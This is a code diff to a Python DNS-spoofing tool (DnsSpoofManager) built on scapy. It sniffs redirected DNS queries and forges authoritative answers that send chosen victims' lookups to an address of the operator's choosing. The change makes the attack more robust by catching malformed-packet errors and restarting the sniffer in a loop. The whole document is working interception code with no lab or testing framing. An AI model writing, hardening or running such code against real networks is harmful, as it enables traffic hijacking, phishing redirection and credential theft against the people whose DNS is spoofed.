@@ -9,6 +9,7 @@ from __future__ import annotations
 
 import subprocess
 import threading
+import time
 from scapy.all import IP, UDP, DNS, DNSRR, send
 
 class DnsSpoofManager:
@@ -57,34 +58,41 @@ class DnsSpoofManager:
         from scapy.all import sniff
         
         def _cb(pkt):
-            if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
-                return
-            if not pkt.haslayer(IP):
-                return
-            
-            src_ip = pkt[IP].src
-            with self._lock:
-                if src_ip not in self._spoof_map:
+            try:
+                if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
                     return
-                redirect_to = self._spoof_map[src_ip]
+                if not pkt.haslayer(IP) or not pkt.haslayer(UDP):
+                    return
+                if not pkt[DNS].qd:
+                    return
 
-            # Craft spoofed response
-            qname = pkt[DNS].qd.qname
-            spoofed_pkt = (
-                IP(dst=pkt[IP].src, src=pkt[IP].dst) /
-                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
-                DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, 
-                    an=DNSRR(rrname=qname, ttl=10, rdata=redirect_to))
-            )
-            send(spoofed_pkt, verbose=False)
+                src_ip = pkt[IP].src
+                with self._lock:
+                    if src_ip not in self._spoof_map:
+                        return
+                    redirect_to = self._spoof_map[src_ip]
 
-        # Sniff on 5353 (where packets were redirected)
-        # Note: REDIRECT to local port still shows original dst port in sniff if not careful? 
-        # Actually REDIRECT changes it.
-        try:
-            sniff(filter="udp port 5353", prn=_cb, store=0)
-        except Exception:
-            self._running = False
+                # Craft spoofed response
+                qname = pkt[DNS].qd.qname
+                spoofed_pkt = (
+                    IP(dst=pkt[IP].src, src=pkt[IP].dst) /
+                    UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
+                    DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,
+                        an=DNSRR(rrname=qname, ttl=10, rdata=redirect_to))
+                )
+                send(spoofed_pkt, verbose=False)
+            except Exception:
+                # A single malformed packet must not tear down the sniffer.
+                return
+
+        # Sniff on 5353 (where packets were redirected). Restart on transient
+        # interface errors instead of permanently disabling the engine.
+        while self._running:
+            try:
+                sniff(filter="udp port 5353", prn=_cb, store=0, timeout=10)
+            except Exception:
+                if self._running:
+                    time.sleep(2)
 
     def stop_all(self):
         self._running = False
